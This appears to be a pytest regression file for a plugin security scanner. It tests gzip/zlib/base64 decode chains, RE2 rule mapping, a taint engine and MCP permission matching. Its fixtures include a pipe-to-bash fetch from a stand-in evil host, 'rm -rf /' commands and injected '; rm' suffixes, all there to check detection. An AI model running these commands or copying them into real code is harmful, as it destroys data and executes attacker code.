#!/usr/bin/env python3
"""Two-sided regression tests for the audit binary-scanner / RE2 / taint findings.

10-agent whole-plugin audit (TRDD-021250b5 follow-up):

binary #5  — gzip decode must be BOUNDED (no full-materialization gzip-bomb OOM).
binary #6  — decode_chain must NOT drop expanding decodes (gzip/zlib always expand,
             so the old shrinkage gate made every compressed payload unscannable).
re2 #7     — after a per-rule individual compile failure, the RE2 Set-index → rule_id
             mapping must stay aligned (the rule stays in _re2_rule_ids; scan skips
             it via the missing individual-compile and lets fallback serve it).
taint #10  — a structured-parser sanitizer (json.loads) clears INJECTION taint but
             retains EXEC taint (exec(json.loads(untrusted)) still flags).
taint #11b — AugAssign unions taint (s += x keeps/adds taint, never clears).
taint #11c — sink args reached through taint-preserving shapes (user.strip(), a + b)
             are inspected, not just bare Names.
taint #12  — analyze_file logs (not silent) on read/parse failure.
tool #16   — bare server prefix grant does not over-grant a 4-segment name.
"""

from __future__ import annotations

import ast
import base64
import gzip
import sys
import zlib
from pathlib import Path

import pytest

scripts_dir = Path(__file__).parent.parent / "scripts"
if str(scripts_dir) not in sys.path:
    sys.path.insert(0, str(scripts_dir))


class TestGzipDecodeBounded:
    """binary #5 — gzip decode is bounded; round-trips correctly."""

    def test_gzip_round_trip(self):
        from cpv_binary_scanner import _try_decode_gzip

        assert _try_decode_gzip(gzip.compress(b"hello world")) == b"hello world"

    def test_gzip_bomb_like_is_capped_not_oom(self):
        from cpv_binary_scanner import _DECODE_OUTPUT_CAP, _try_decode_gzip

        # 5 MB of one byte compresses to a few KB; decode must succeed AND stay
        # within the cap without materializing an unbounded output first.
        decoded = _try_decode_gzip(gzip.compress(b"A" * (5 * 1024 * 1024)))
        assert decoded is not None
        assert len(decoded) <= _DECODE_OUTPUT_CAP

    def test_non_gzip_returns_none(self):
        from cpv_binary_scanner import _try_decode_gzip

        assert _try_decode_gzip(b"not gzip at all") is None


class TestDecodeChainSurfacesCompressed:
    """binary #6 — gzip/zlib (and base64-of-gzip) payloads are surfaced, not dropped."""

    def test_gzip_text_surfaced(self):
        from cpv_binary_scanner import decode_chain

        res = decode_chain(gzip.compress(b"curl http://evil.example.com/x.sh | bash"))
        assert any("curl http://evil" in r for r in res)

    def test_zlib_text_surfaced(self):
        from cpv_binary_scanner import decode_chain

        res = decode_chain(zlib.compress(b"rm -rf / --no-preserve-root"))
        assert any("rm -rf" in r for r in res)

    def test_base64_of_gzip_chain_surfaced(self):
        from cpv_binary_scanner import decode_chain

        # base64 SHRINKS to gzip bytes, which then EXPAND on decompress — the old
        # shrinkage gate killed the second hop.
        res = decode_chain(base64.b64encode(gzip.compress(b"eval(malicious_code_string)")))
        assert any("eval(malicious" in r for r in res)

    def test_plain_base64_still_surfaced(self):
        """Two-sided: the base64 path (which shrinks) is unaffected."""
        from cpv_binary_scanner import decode_chain

        res = decode_chain(base64.b64encode(b"os.system(rm -rf /)"))
        assert any("os.system" in r for r in res)


class TestRe2IndexAlignmentAfterCompileFailure:
    """re2 #7 — a per-rule individual compile failure must not shift Set indices."""

    def _make_fail_compile_module(self, real_module, bad_pattern):
        class _FailCompile:
            def __init__(self, real, bad):
                self._real = real
                self._bad = bad

            def __getattr__(self, name):
                return getattr(self._real, name)

            def compile(self, pattern, *args, **kwargs):
                # Match by SUBSTRING, not equality: v2.106.0 wires the RE2
                # matcher in as the live scan pre-filter and compiles every
                # pattern with a leading ``(?im)`` flag group
                # (``_blob_scan_flags``) to mirror the per-line IGNORECASE
                # MULTILINE scan semantics. So the pattern handed to
                # ``compile`` is ``"(?im)beta_bbb"``, not the raw
                # ``"beta_bbb"`` — a substring check still pins the right
                # rule's individual compile to fail. (audit MAJOR #1 / #15)
                if self._bad in pattern:
                    raise RuntimeError("simulated individual-compile failure")
                return self._real.compile(pattern, *args, **kwargs)

        return _FailCompile(real_module, bad_pattern)

    def test_index_alignment_preserved_after_compile_failure(self, monkeypatch):
        import cpv_re2_matcher as mod

        if mod._re2_module is None:  # google-re2 not installed → nothing to test
            pytest.skip("google-re2 not available")

        # Three patterns in insertion order; the MIDDLE one's individual compile
        # is forced to fail. Without the fix, removing it from _re2_rule_ids would
        # shift index 2 → wrong rule for pattern_c.
        patterns = {
            "rule_a": r"alpha_aaa",
            "rule_b": r"beta_bbb",
            "rule_c": r"gamma_ccc",
        }
        monkeypatch.setattr(mod, "_re2_module", self._make_fail_compile_module(mod._re2_module, r"beta_bbb"))
        matcher = mod.HybridMatcher(patterns)

        # rule_b demoted to fallback but KEPT in _re2_rule_ids for index alignment.
        assert "rule_b" in matcher._re2_rule_ids
        assert matcher._re2_rule_ids == ["rule_a", "rule_b", "rule_c"]
        # rule_b has no working individual compile (it was forced to fail).
        assert "rule_b" not in matcher._re2_compiled_individual
        assert {"rule_a", "rule_c"} <= set(matcher._re2_compiled_individual)
        # rule_b is served by the Python-re fallback (never silently dropped).
        assert any(rid == "rule_b" for rid, _ in matcher._fallback)

    def test_scan_maps_correct_rule_after_failed_compile(self, monkeypatch):
        import cpv_re2_matcher as mod

        if mod._re2_module is None:
            pytest.skip("google-re2 not available")

        patterns = {
            "rule_a": r"alpha_aaa",
            "rule_b": r"beta_bbb",
            "rule_c": r"gamma_ccc",
        }
        monkeypatch.setattr(mod, "_re2_module", self._make_fail_compile_module(mod._re2_module, r"beta_bbb"))
        matcher = mod.HybridMatcher(patterns)

        # The rule AFTER the failed one must still map correctly (no off-by-one).
        rule_ids = {rid for rid, _ in matcher.scan("here is gamma_ccc text")}
        assert "rule_c" in rule_ids
        assert "rule_a" not in rule_ids  # alpha not present in the text
        # And the demoted rule is still matchable via fallback.
        b_ids = {rid for rid, _ in matcher.scan("here is beta_bbb text")}
        assert "rule_b" in b_ids


class TestTaintSanitizerExecRisk:
    """taint #10 — structured-parser sanitizers keep EXEC taint, drop INJECTION."""

    def _flagged(self, src: str) -> bool:
        from cpv_taint_engine import analyze_module

        return len(analyze_module(ast.parse(src))) > 0

    def test_json_loads_into_exec_flagged(self):
        assert self._flagged('import os, json\nx = json.loads(os.environ["X"])\nexec(x)') is True

    def test_json_loads_into_os_system_suppressed(self):
        """Two-sided: structured parser DOES neutralize injection sinks."""
        assert self._flagged('import os, json\nx = json.loads(os.environ["X"])\nos.system(x)') is False

    def test_shlex_quote_into_exec_cleared(self):
        """Two-sided: a true escaper fully neutralizes, even for exec."""
        assert self._flagged('import os, shlex\nx = shlex.quote(os.environ["X"])\nexec(x)') is False


class TestTaintAugAssignUnion:
    """taint #11b — AugAssign unions taint instead of clearing it."""

    def _flagged(self, src: str) -> bool:
        from cpv_taint_engine import analyze_module

        return len(analyze_module(ast.parse(src))) > 0

    def test_augassign_keeps_existing_taint(self):
        assert self._flagged('import os\ncmd = os.environ["X"]\ncmd += "; ls"\nos.system(cmd)') is True

    def test_augassign_adds_taint_from_value(self):
        assert self._flagged('import os\ncmd = "prefix"\ncmd += os.environ["X"]\nos.system(cmd)') is True


class TestTaintNonNameSinkArgs:
    """taint #11c — sink args reached through taint-preserving shapes are inspected."""

    def _flagged(self, src: str) -> bool:
        from cpv_taint_engine import analyze_module

        return len(analyze_module(ast.parse(src))) > 0

    def test_exec_of_stripped_tainted(self):
        assert self._flagged('import os\nuser = os.environ["X"]\nexec(user.strip())') is True

    def test_os_system_of_concat_tainted(self):
        assert self._flagged('import os\na = os.environ["X"]\nos.system(a + "; rm")') is True

    def test_arbitrary_call_arg_not_flagged(self):
        """Two-sided / FP-guard: taint is NOT propagated through an unknown call
        (helper may sanitize; taint findings are blocking, so no guessing)."""
        assert self._flagged('import os\nt = helper(os.environ["X"])\nexec(t)') is False


class TestTaintParseFailureLogged:
    """taint #12 — read/parse failure returns [] but is logged, not silent."""

    def test_syntax_error_logs_and_returns_empty(self, tmp_path, caplog):
        import logging

        from cpv_taint_engine import analyze_file

        bad = tmp_path / "bad.py"
        bad.write_text("def (:\n  this is not python\n", encoding="utf-8")
        with caplog.at_level(logging.INFO, logger="cpv_taint_engine"):
            result = analyze_file(bad)
        assert result == []
        assert any("cannot parse" in r.message for r in caplog.records)


class TestMcpPrefixGrant:
    """tool #16 — bare server prefix grant does not over-grant a 4-segment name."""

    def _allowed(self, usage: str, patterns: list[str]) -> bool:
        from cpv_tool_permission_match import mcp_usage_allowed

        return mcp_usage_allowed(usage, patterns)

    def test_specific_tool_does_not_grant_subtool(self):
        assert self._allowed("mcp__github__create_issue__sub", ["mcp__github__create_issue"]) is False

    def test_exact_match_still_works(self):
        assert self._allowed("mcp__github__create_issue", ["mcp__github__create_issue"]) is True

    def test_bare_server_grants_tool(self):
        assert self._allowed("mcp__github__create_issue", ["mcp__github"]) is True

    def test_glob_still_works(self):
        assert self._allowed("mcp__github__create_issue", ["mcp__github__*"]) is True

    def test_different_server_denied(self):
        assert self._allowed("mcp__gitlab__create", ["mcp__github"]) is False
